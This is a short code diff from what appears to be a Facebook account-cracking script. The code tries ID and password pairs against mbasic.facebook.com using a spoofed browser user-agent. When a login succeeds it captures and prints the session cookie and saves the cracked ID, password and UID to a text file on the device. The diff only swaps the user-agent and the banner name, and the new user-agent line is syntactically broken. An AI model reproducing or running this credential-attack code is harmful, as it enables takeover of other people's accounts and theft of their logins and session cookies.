@@ -81,7 +81,7 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://mbasic.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
+header_grup = {"user-agent": Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 ugen=[]
@@ -286,7 +286,7 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [ASRAF-ðŸ’š] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [Shanto] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m=[ðŸ’™]=COOKIE : '+coki)
                 oks.append(cid)
                 open('/sdcard/ASRAF-OKðŸ’¥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
